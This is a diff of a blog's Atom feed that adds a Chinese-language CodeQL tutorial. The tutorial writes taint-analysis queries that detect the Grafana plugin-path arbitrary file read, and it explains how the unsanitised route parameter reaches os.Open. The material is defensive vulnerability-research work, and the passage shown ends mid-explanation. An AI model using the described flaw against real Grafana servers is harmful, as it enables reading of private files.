@@ -4,7 +4,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom" xml:lang="zh-CN">
     <title type="text">tyskillのBlog</title>
     <subtitle type="html">tyskill的水池</subtitle>
-    <updated>2021-08-30T19:24:12&#43;08:00</updated>
+    <updated>2021-12-19T17:30:11&#43;08:00</updated>
     <id>https://tyskill.github.io/</id>
     <link rel="alternate" type="text/html" href="https://tyskill.github.io/" />
     <link rel="self" type="application/atom&#43;xml" href="https://tyskill.github.io/atom.xml" />
@@ -15,7 +15,405 @@
                 <email>tyskill@foxmail.com</email>
             </author>
     <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights>
-    <generator uri="https://gohugo.io/" version="0.87.0">Hugo</generator>
+    <generator uri="https://gohugo.io/" version="0.90.1">Hugo</generator>
+        <entry>
+            <title type="text">CodeQL第一步-Grafana任意文件读</title>
+            <link rel="alternate" type="text/html" href="https://tyskill.github.io/posts/codeql-grafana/" />
+            <id>https://tyskill.github.io/posts/codeql-grafana/</id>
+            <updated>2021-12-18T00:00:00&#43;00:00</updated>
+            <published>2021-12-16T00:00:00&#43;00:00</published>
+            <author>
+                    <name>tyskill</name>
+                    <uri>https://tyskill.github.io</uri>
+                    <email>tyskill@foxmail.com</email>
+                    </author>
+            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">概述 介绍及搭建教程：https://www.freebuf.com/sectool/269924……</summary>
+            
+                <content type="html">&lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;介绍及搭建教程&lt;/strong&gt;：&lt;a href=&#34;https://www.freebuf.com/sectool/269924.html&#34;&gt;https://www.freebuf.com/sectool/269924.html&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Golang依赖库&lt;/strong&gt;：&lt;a href=&#34;https://github.com/github/codeql-go&#34;&gt;https://github.com/github/codeql-go&lt;/a&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;注意：该依赖库应该独立为一个workspace而不是放进CLI项目中&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;内置资源&lt;/strong&gt;：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;code&gt;ql/examples/snippets&lt;/code&gt;目录提供了一些基础的ql文件，通过阅读与仿写可以了解一些基本的使用，具体有哪些就自己去看吧，反正也不多&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;lib/security&lt;/code&gt;目录下定义了一些常见漏洞的检测规则，通过&lt;code&gt;import semmle.go.security.[module]&lt;/code&gt;导入ql文件配合污点分析使用&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;基础使用&#34;&gt;基础使用&lt;/h2&gt;
+&lt;h3 id=&#34;寻找指定方法和调用点&#34;&gt;寻找指定方法和调用点&lt;/h3&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-ql&#34; data-lang=&#34;ql&#34;&gt;import go
+// 方法一
+from Function func
+where func.hasQualifiedName(&amp;quot;os&amp;quot;, &amp;quot;Open&amp;quot;)
+select func, func.getAReference()
+
+// 方法二
+	// call.getTarget()相当于Function
+	// call.getExpr()、call.asExpr()和call.getTarget().getAReference()同理
+from DataFlow::CallNode call
+where call.getTarget().hasQualifiedName(&amp;quot;os&amp;quot;, &amp;quot;Open&amp;quot;)
+select call.getTarget(), call.getExpr(), call.getTarget().getAReference()
+
+// 方法三
+from Function func, DataFlow::CallNode call
+where
+ func.hasQualifiedName(&amp;quot;os&amp;quot;, &amp;quot;Open&amp;quot;) and
+ call = func.getACall()
+select func, call
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;获得方法参数&#34;&gt;获得方法参数&lt;/h3&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-ql&#34; data-lang=&#34;ql&#34;&gt;// 方法一 -- 获得函数定义时的参数（receiver和param）
+from Function func
+where func.getName() = &amp;quot;getPluginAssets&amp;quot;
+select func.getAParameter()
+
+// 方法二 -- 获得函数调用时的参数
+from DataFlow::CallNode call
+// from CallExpr call也可以
+where call.getTarget().hasQualifiedName(&amp;quot;os&amp;quot;, &amp;quot;Open&amp;quot;)
+select call.getAnArgument()
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;查询指定参数的方法&#34;&gt;查询指定参数的方法&lt;/h3&gt;
+&lt;p&gt;注：查询结果排序区分大小写，按ASCII排序&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// 通过参数类型查询参数
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Function&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;func&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Parameter&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;param&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;PointerType&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;ptype&lt;/span&gt;
+&lt;span class=&#34;nx&#34;&gt;where&lt;/span&gt;
+&lt;span class=&#34;nx&#34;&gt;ptype&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;getBaseType&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;hasQualifiedName&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;github.com/grafana/grafana/pkg/models&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;ReqContext&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;and&lt;/span&gt;
+&lt;span class=&#34;nx&#34;&gt;param&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;getType&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;ptype&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;and&lt;/span&gt;
+&lt;span class=&#34;kd&#34;&gt;func&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;getAParameter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;param&lt;/span&gt;
+&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;func&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;其他&#34;&gt;其他&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;getExpr和asExpr区别&lt;/strong&gt;：&lt;/p&gt;
+&lt;p&gt;从注释上看：&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;getExpr：Gets the underlying expression this node corresponds to.（获取此节点对应的基础表达式）
+asExpr：Gets the expression corresponding to this node, if any.（获取与此节点对应的表达式（如果有））&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;两个方法分别是获得基础表达式和节点对应表达式，应该是有区别的，但是在函数体中两者却是相同的：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-ql&#34; data-lang=&#34;ql&#34;&gt;class ExprNode extends InstructionNode {
+	 override IR::EvalInstruction insn;
+	 Expr expr;
+	 ExprNode() { expr = insn.getExpr() }
+	 override Expr asExpr() { result = expr }
+/** Gets the underlying expression this node corresponds to. */
+	 Expr getExpr() { result = expr }
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;唯一的区别就是asExpr是通过覆写基类&lt;code&gt;Node::asExpr&lt;/code&gt;方法来实现的，所以到底有什么区别我也不知道（有营销号那味儿了2333
+不管了，目前看到的文章中都是用asExpr，那就暂且用这个吧。等等党终会获得胜利（bushi&lt;/p&gt;
+&lt;p&gt;其他的使用方法见&lt;a href=&#34;http://f4bb1t.com/post/2020/12/15/codeql-for-golang-practise2/&#34;&gt;http://f4bb1t.com/post/2020/12/15/codeql-for-golang-practise2/&lt;/a&gt;（or直接读examples）&lt;/p&gt;
+&lt;h2 id=&#34;污点分析&#34;&gt;污点分析&lt;/h2&gt;
+&lt;h3 id=&#34;概述-1&#34;&gt;概述&lt;/h3&gt;
+&lt;p&gt;文章&lt;a href=&#34;https://www.modb.pro/db/139793&#34;&gt;https://www.modb.pro/db/139793&lt;/a&gt;直接借助了官方提供的SqlInjection模块，代码在&lt;code&gt;lib/semmle/go/security/SqlInjection&lt;/code&gt;目录下，其内部定义了Configuration类提供source、sink检测以及节点是否可被污染的状态变化，并通过定义isAdditionalTaintStep方法扩展了NoSQL的污染方式&lt;/p&gt;
+&lt;p&gt;基于此我们可以了解一个污点分析模块基本的写法：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;定义一个继承&lt;code&gt;TaintTracking::Configuration&lt;/code&gt;的类&lt;/li&gt;
+&lt;li&gt;source、sink判断/isSource、isSink&lt;/li&gt;
+&lt;li&gt;可选：节点状态判断/isSanitizer、isSanitizerGuard&lt;/li&gt;
+&lt;li&gt;可选：是否存在其他的污染方式/isAdditionalTaintStep，即中断的数据流能否有方式重新连接&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;实践grafana任意文件读取&#34;&gt;实践/Grafana任意文件读取&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;数据库懒得编译，就直接用现成的：&lt;a href=&#34;https://github.com/safe6Sec/codeql-grafana&#34;&gt;https://github.com/safe6Sec/codeql-grafana&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;漏洞成因&lt;/strong&gt;：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;plugins api权限为public，任何人都可以查看&lt;/li&gt;
+&lt;li&gt;传入参数被直接拼接进了插件路径&lt;/li&gt;
+&lt;li&gt;未经处理的路径被Open函数处理，导致任意文件读取&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;strong&gt;规则编写&lt;/strong&gt;：
+sink很明显，就是Open函数：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-ql&#34; data-lang=&#34;ql&#34;&gt;class Sink extends DataFlow::Node {
+	Sink() {
+		exists(
+			DataFlow::CallNode call |
+			call.getTarget().hasQualifiedName(&amp;quot;os&amp;quot;, &amp;quot;Open&amp;quot;) |
+			call.getArgument(0) = this // 标记 sink 为 os.Open 第一个参数
+		)
+	}
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;source可以锁定为 router 参数，那么应该与Context类型有关，也就是&lt;code&gt;*models.ReqContext&lt;/code&gt;类，但是写不出来emmm...那就照着&lt;a href=&#34;https://xz.aliyun.com/t/10648&#34;&gt;文章&lt;/a&gt;中查询 router 注册的思路走。&lt;/p&gt;
+&lt;p&gt;定义source如下：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span class=&#34;nx&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;GfSource&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;DataFlow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Node&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+    &lt;span class=&#34;nf&#34;&gt;GfSource&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+        &lt;span class=&#34;nf&#34;&gt;exists&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
+            &lt;span class=&#34;nx&#34;&gt;Function&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;func&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;DataFlow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;CallNode&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;call&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+            &lt;span class=&#34;nx&#34;&gt;call&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;getTarget&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;hasQualifiedName&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
+                &lt;span class=&#34;s&#34;&gt;&amp;#34;github.com/grafana/grafana/pkg/api/routing.RouteRegister&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+                &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Get&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;Post&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;Delete&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;Put&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;Patch&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;Any&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+            &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;and&lt;/span&gt;
+            &lt;span class=&#34;kd&#34;&gt;func&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;getAParameter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;asParameter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// source设置为参数
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;如果单纯的这样写会查询出大量的source，因此需要添加限制条件来减少误报，通过观察源码发现router注册参数大部分都是&lt;code&gt;string, selectorExpr&lt;/code&gt;和&lt;code&gt;string, CallExpr(selectorExpr)&lt;/code&gt;格式，因此可以将参数格式限制为SelectorExpr，可以看到文中添加了大量的SelectorExpr过滤条件：&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;selectorExpr为符合&lt;code&gt;f.x&lt;/code&gt;格式的表达式&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;call&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;getAnArgument&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;se&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;call&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;getAnArgument&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;getAChildExpr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;se&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;and&lt;/span&gt;
+&lt;span class=&#34;nx&#34;&gt;fun&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;getAReference&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;se&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;getSelector&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;and&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;因此完整的source为：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span class=&#34;nx&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;GfSource&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;DataFlow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Node&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+    &lt;span class=&#34;nf&#34;&gt;GfSource&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+        &lt;span class=&#34;nf&#34;&gt;exists&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
+            &lt;span class=&#34;nx&#34;&gt;Function&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;func&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;CallExpr&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;call&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;SelectorExpr&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;se&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+            &lt;span class=&#34;nx&#34;&gt;call&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;getTarget&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;hasQualifiedName&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
+                &lt;span class=&#34;s&#34;&gt;&amp;#34;github.com/grafana/grafana/pkg/api/routing.RouteRegister&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+                &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Get&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;Post&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;Delete&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;Put&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;Patch&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;Any&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+            &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;and&lt;/span&gt;
+            &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;call&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;getAnArgument&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;se&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;call&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;getAnArgument&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;getAChildExpr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;se&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;and&lt;/span&gt;
+            &lt;span class=&#34;kd&#34;&gt;func&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;getAReference&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;se&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;getSelector&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;and&lt;/span&gt;
+            &lt;span class=&#34;kd&#34;&gt;func&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;getAParameter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;asParameter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// source设置为参数
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Query发现没有结果，因为没有Context传递参数导致在获取路径阶段就截断了，因此需要仿写SqlInjection模块的isAdditionalTaintStep方法串联数据流：&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;我一开始的思路是仿照SqlInjection模块的isAdditionalTaintStep方法编写规则，但是那样查询出来的结果太多了，稍微加点限制就查询无果，只好放弃挣扎了&lt;/p&gt;
+&lt;/blockquote&gt;
